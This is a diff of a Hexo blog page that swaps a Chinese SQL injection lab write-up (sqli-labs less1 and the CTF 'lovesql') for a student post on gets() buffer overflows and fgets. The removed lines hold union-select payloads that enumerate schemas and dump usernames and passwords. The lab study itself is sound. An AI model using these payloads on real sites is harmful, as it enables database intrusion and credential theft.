@@ -4,19 +4,22 @@
   <meta charset="utf-8">
   
   
-  <title>less1,lovesql | Hexo</title>
+  <title>c语言中gets问题 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="less1.判断是否存在注入?id&#x3D;1，存在回显，加上‘后回显错误，判断其是单引号字符型注入 后用order by语句判断有几列数据">
+  <meta name="description" content="C语言程序中gets（）缓冲区溢出问题寒假小作业">
 <meta property="og:type" content="article">
-<meta property="og:title" content="less1,lovesql">
-<meta property="og:url" content="http://example.com/2021/11/17/less1-lovesql/index.html">
+<meta property="og:title" content="c语言中gets问题">
+<meta property="og:url" content="http://example.com/2022/01/16/c%E8%AF%AD%E8%A8%80%E4%B8%ADgets%E9%97%AE%E9%A2%98/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="less1.判断是否存在注入?id&#x3D;1，存在回显，加上‘后回显错误，判断其是单引号字符型注入 后用order by语句判断有几列数据">
+<meta property="og:description" content="C语言程序中gets（）缓冲区溢出问题寒假小作业">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-11-17T07:29:24.000Z">
-<meta property="article:modified_time" content="2021-11-17T10:44:14.820Z">
+<meta property="og:image" content="https://s2.loli.net/2022/01/16/lU3Hp2OwhvWngu5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/16/usnpWHFAC6YBo3V.png">
+<meta property="article:published_time" content="2022-01-16T07:49:46.000Z">
+<meta property="article:modified_time" content="2022-01-16T07:50:20.164Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/01/16/lU3Hp2OwhvWngu5.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -73,10 +76,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-less1-lovesql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-c语言中gets问题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/11/17/less1-lovesql/" class="article-date">
-  <time class="dt-published" datetime="2021-11-17T07:29:24.000Z" itemprop="datePublished">2021-11-17</time>
+    <a href="/2022/01/16/c%E8%AF%AD%E8%A8%80%E4%B8%ADgets%E9%97%AE%E9%A2%98/" class="article-date">
+  <time class="dt-published" datetime="2022-01-16T07:49:46.000Z" itemprop="datePublished">2022-01-16</time>
 </a>
     
   </div>
@@ -87,7 +90,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      less1,lovesql
+      c语言中gets问题
     </h1>
   
 
@@ -95,26 +98,27 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="less1"><a href="#less1" class="headerlink" title="less1."></a>less1.</h2><p>判断是否存在注入?id=1，存在回显，加上‘后回显错误，判断其是单引号字符型注入</p>
-<p>后用order by语句判断有几列数据</p>
-<span id="more"></span> 
+        <h1 id="C语言程序中gets（）缓冲区溢出问题"><a href="#C语言程序中gets（）缓冲区溢出问题" class="headerlink" title="C语言程序中gets（）缓冲区溢出问题"></a>C语言程序中gets（）缓冲区溢出问题</h1><p>寒假小作业</p>
+<span id="more"></span>  
 
-<p>UNION SELECT联合查询，在这改成id=-1，-1是数据库中不存在的，所以用union select查询后是否用回显位</p>
-<p>在这道题</p>
-<p>查库union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
-<p>查表union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0xsecurity–+</p>
-<p>查字段union select column_name from information_schema.columns where table_name=0xusers</p>
-<p>查数据union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+<br>在这里使用hackbar转换表名为16进制，可以避免‘’的错误</p>
-<p>函数 </p>
-<p>1.group_concat直接查询所有的数据</p>
-<p>2.concat_ws(‘<del>‘)将要查询的两个数据用</del>连接，与group_concat联合使用查询全部</p>
-<h2 id="lovesql"><a href="#lovesql" class="headerlink" title="lovesql."></a>lovesql.</h2><p>与less1的做法大概相同。<br>判断需要#，order by，union<br>查库 select 1,database(),3# 得到username为geek<br>查表 select 1,2,group_concat(table_name) from infromation_schema.tables where table schema=database()#得到数据后<br>查字段 select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’#<br>查数据 select 1,2,group_concat(id,username,password) from l0ve1ysq1#</p>
-<p>而在这题好像只能在给出的两个输入框中输入，无法转换成16进制</p>
+<h2 id="一、问题或漏洞描述"><a href="#一、问题或漏洞描述" class="headerlink" title="一、问题或漏洞描述"></a><strong>一、问题或漏洞描述</strong></h2><p>gets函数是C语言中较常见的读取字符串的函数，原型为char<em>gets（char</em>buff）</p>
+<p>但gets函数存在漏洞，当用户在键盘上输入的字符个数大于buff的上限，但gets并不会对其进行检查，有时会造成c程序的崩溃。</p>
+<h2 id="二、举例说明"><a href="#二、举例说明" class="headerlink" title="二、举例说明"></a><strong>二、举例说明</strong></h2><p>例：</p>
+<p><img src="https://s2.loli.net/2022/01/16/lU3Hp2OwhvWngu5.png" alt="屏幕截图 2022-01-16 134858.png"></p>
+<p>在这个例子中gets能读取的最大长度为10位</p>
+<p>当输入123456789（小于10）时</p>
+<p>输出为</p>
+<p><img src="https://s2.loli.net/2022/01/16/usnpWHFAC6YBo3V.png" alt="屏幕截图 2022-01-16 135513.png">而当输入为123456789789（长度大于10)时</p>
+<p>则会看到系统提示已奔溃</p>
+<h2 id="三、分析产生原因"><a href="#三、分析产生原因" class="headerlink" title="三、分析产生原因"></a><strong>三、分析产生原因</strong></h2><p>由此可以看出如果不正确使用gets函数，造成的危害是很大的</p>
+<p>原因为用户输入字符串的长度大于缓存区的长度，而gets函数没有检测供能，也就不能截断，而是原样输出读入的字符串，而造成崩溃。</p>
+<h2 id="四、避免或防范措施"><a href="#四、避免或防范措施" class="headerlink" title="四、避免或防范措施"></a><strong>四、避免或防范措施</strong></h2><p>因为gets的局限，我们可以使用fgets来代替 gets</p>
+<p>fgets可以从指定的流中读取一行，并把它存储在字符串中，当读取到n-1个字符或者是换行符时，或者时到达文件末尾时，会自动截断。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/17/less1-lovesql/" data-id="ckygylcfm00064otya801g0we" data-title="less1,lovesql" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/01/16/c%E8%AF%AD%E8%A8%80%E4%B8%ADgets%E9%97%AE%E9%A2%98/" data-id="ckygylcfl00044oty0i8ugalz" data-title="c语言中gets问题" class="article-share-link">Share</a>
       
       
       
@@ -124,19 +128,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/11/20/less2-5/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          less2-5
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/11/14/%E5%85%B3%E4%BA%8Esql%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/11/27/less6-7/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">关于sql靶场的搭建问题</div>
+      <div class="article-nav-title">less6-7</div>
     </a>
   
 </nav>
